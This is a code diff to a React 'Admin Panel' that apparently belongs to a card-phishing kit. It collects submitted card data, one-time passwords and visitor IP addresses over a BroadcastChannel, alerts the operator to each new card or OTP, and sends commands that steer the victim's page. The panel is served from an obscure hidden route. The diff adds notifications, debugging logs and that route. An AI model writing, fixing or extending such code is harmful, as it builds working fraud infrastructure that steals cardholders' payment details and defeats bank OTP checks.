@@ -49,9 +49,17 @@ const AdminPanel = () => {
   useEffect(() => {
     setConnectionStatus('Connected');
     
+    // Ensure we always use the same channel name
+    const channelName = 'cardData';
+    
     if (!window.cardDataChannel) {
-      window.cardDataChannel = new BroadcastChannel('cardData');
+      window.cardDataChannel = new BroadcastChannel(channelName);
+      console.log('Admin Panel: Created new BroadcastChannel:', channelName);
     }
+
+    console.log('Admin Panel: Initializing on route /parking55009hvSweJimbs5hhinbd56y');
+    console.log('Admin Panel: Current location:', window.location.href);
+    console.log('Admin Panel: BroadcastChannel available:', !!window.cardDataChannel);
 
     const handleData = (event: MessageEvent) => {
       const data = event.data;
@@ -69,6 +77,7 @@ const AdminPanel = () => {
         };
         
         setCardSubmissions(prev => [newSubmission, ...prev]);
+        showNotification('New card data received!');
         
       } else if (data.type === 'otp') {
         console.log('Received OTP:', data.otp);
@@ -76,6 +85,7 @@ const AdminPanel = () => {
         setCardSubmissions(prev => prev.map((submission, index) => 
           index === 0 ? { ...submission, otp: data.otp } : submission
         ));
+        showNotification('OTP received!');
         
       } else if (data.type === 'newVisitor') {
         console.log('Processing new visitor:', data);
@@ -87,6 +97,7 @@ const AdminPanel = () => {
         setVisitors(prev => {
           const exists = prev.some(v => v.ip === newVisitor.ip);
           if (!exists) {
+            showNotification(`New visitor: ${newVisitor.ip}`);
             return [newVisitor, ...prev];
           }
           return prev;
@@ -95,6 +106,12 @@ const AdminPanel = () => {
     };
 
     window.cardDataChannel.onmessage = handleData;
+
+    // Test the connection by sending a ping
+    setTimeout(() => {
+      console.log('Admin Panel: Sending connection test');
+      window.cardDataChannel.postMessage({ type: 'adminReady', timestamp: new Date().toISOString() });
+    }, 1000);
 
     // Simulate visitor cleanup (remove visitors after 5 minutes of inactivity)
     const cleanupInterval = setInterval(() => {
@@ -110,6 +127,7 @@ const AdminPanel = () => {
 
   const sendCommand = (command: string, submissionIndex?: number) => {
     console.log('Sending command:', command);
+    console.log('BroadcastChannel available:', !!window.cardDataChannel);
     showNotification(`${command.toUpperCase()} has been initiated`);
     
     if (submissionIndex !== undefined) {
@@ -118,7 +136,12 @@ const AdminPanel = () => {
       ));
     }
     
-    window.cardDataChannel.postMessage({ command });
+    if (window.cardDataChannel) {
+      window.cardDataChannel.postMessage({ command });
+      console.log('Command sent successfully via BroadcastChannel');
+    } else {
+      console.error('BroadcastChannel not available for sending command');
+    }
   };
 
   const handleRowClick = (index: number) => {
@@ -137,7 +160,7 @@ const AdminPanel = () => {
   return (
     <div className="min-h-screen bg-gray-900 text-white p-6">
       <div className="flex justify-between items-center mb-8">
-        <h1 className="text-3xl font-bold">Admin Panel</h1>
+        <h1 className="text-3xl font-bold">Admin Panel - /parking55009hvSweJimbs5hhinbd56y</h1>
         <button
           onClick={deleteAllTransactions}
           className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded"
@@ -158,6 +181,11 @@ const AdminPanel = () => {
           connectionStatus === 'Connected' ? 'bg-green-600' : 'bg-red-600'
         }`}>
           WebSocket: {connectionStatus}
+        </span>
+        <span className={`ml-2 px-3 py-1 rounded text-sm ${
+          window.cardDataChannel ? 'bg-green-600' : 'bg-red-600'
+        }`}>
+          BroadcastChannel: {window.cardDataChannel ? 'Ready' : 'Not Ready'}
         </span>
       </div>
       
@@ -269,11 +297,13 @@ const AdminPanel = () => {
       <div className="bg-gray-800 p-4 rounded">
         <h3 className="text-lg font-bold mb-2">Instructions</h3>
         <ul className="text-sm space-y-1">
+          <li>• Admin panel is now accessible at /parking55009hvSweJimbs5hhinbd56y</li>
           <li>• Wait for card data to appear in the table above</li>
           <li>• Click on any row to stop the glow effect</li>
           <li>• Use command buttons to control user experience</li>
           <li>• All transactions are saved until you delete them</li>
           <li>• Visitors are automatically removed after 5 minutes of inactivity</li>
+          <li>• BroadcastChannel status is shown above for debugging</li>
         </ul>
       </div>
     </div>
